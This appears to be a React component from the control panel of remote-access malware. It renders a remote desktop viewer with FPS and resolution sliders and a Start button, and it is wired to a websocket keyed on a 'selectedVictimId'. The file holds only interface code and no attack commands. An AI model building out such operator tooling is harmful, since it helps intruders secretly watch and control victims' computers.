"use client";

import { useEffect } from "react";
import { useQueryClient } from "@tanstack/react-query";

import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { bindRemoteDesktopActions } from "./remote-desktop/bind-remote-desktop-actions";

export function RemoteDesktopSection() {
   const detail = usePanelDetailView();
   const ws = usePanelWS();
   const qc = useQueryClient();

   useEffect(() => {
      return bindRemoteDesktopActions({
         selectedVictimId: detail.selectedVictimId,
         qc,
         ws,
      });
   }, [detail.selectedVictimId, qc, ws]);

   return (
      <div className="detail-section h-full">
         <div className="relative h-full w-full">
            <div id="remoteDesktopInner" className="relative h-full w-full bg-[#111]">
               <div
                  id="remoteDesktopPanel"
                  className="group pointer-events-auto absolute left-0 right-0 top-0 z-[5] h-[58px]"
               >
                  <div
                     id="remoteDesktopToolbar"
                     className={
                        "pointer-events-auto absolute left-[12px] right-[12px] top-[10px] flex h-[34px] items-center justify-between gap-[12px] rounded-[12px] border border-white/15 " +
                        "bg-black/45 p-[6px_10px] shadow-[0_14px_30px_rgba(0,0,0,0.72)] backdrop-blur-[10px] " +
                        "translate-y-[-54px] opacity-0 transition-[transform,opacity] duration-150 group-hover:translate-y-0 group-hover:opacity-100"
                     }
                  >
                     <div className="w-[24px]" />
                     <div className="flex flex-1 items-center justify-center gap-[18px]">
                        <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                           <span className="font-semibold">FPS</span>
                           <input id="remoteDesktopFps" className="w-[120px]" type="range" min={1} max={60} defaultValue={30} />
                           <span id="remoteDesktopFpsValue" className="min-w-[26px] text-right font-bold">
                              30
                           </span>
                        </div>

                        <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                           <span className="font-semibold">Resolution %</span>
                           <input
                              id="remoteDesktopResolution"
                              className="w-[120px]"
                              type="range"
                              min={10}
                              max={100}
                              defaultValue={75}
                           />
                           <span id="remoteDesktopResolutionValue" className="min-w-[26px] text-right font-bold">
                              75
                           </span>
                        </div>
                     </div>
                     <div className="flex items-center">
                        <button
                           id="remoteDesktopStartBtn"
                           type="button"
                           className={
                              "min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] " +
                              "shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                           }
                           style={{ borderBottom: "4px solid var(--line)" }}
                        >
                           Start
                        </button>
                     </div>
                  </div>

                  <div
                     id="remoteDesktopToolbarLine"
                     className={
                        "absolute left-[12px] right-[12px] top-[46px] h-[2px] bg-[var(--line)] opacity-0 translate-y-[-54px] transition-[transform,opacity] duration-150 group-hover:translate-y-0 group-hover:opacity-95"
                     }
                  />
               </div>

               <div id="remoteDesktopLoader" className="pointer-events-none absolute left-1/2 top-1/2 z-[3] h-[130px] w-[130px] -translate-x-1/2 -translate-y-1/2">
                  <div className="absolute left-1/2 top-1/2 h-[100px] w-[100px] -translate-x-1/2 -translate-y-1/2 border-[3px] border-[#ff4040]" />
                  <div className="absolute left-1/2 top-1/2 h-[100px] w-[100px] -translate-x-1/2 -translate-y-1/2 border-[3px] border-white" />
               </div>

               <div id="remoteDesktopScreen" className="absolute inset-0 hidden overflow-hidden bg-[#111]" aria-label="Remote desktop">
                  <div id="remoteDesktopStream" className="absolute inset-0 hidden" />
               </div>
            </div>
         </div>
      </div>
   );
}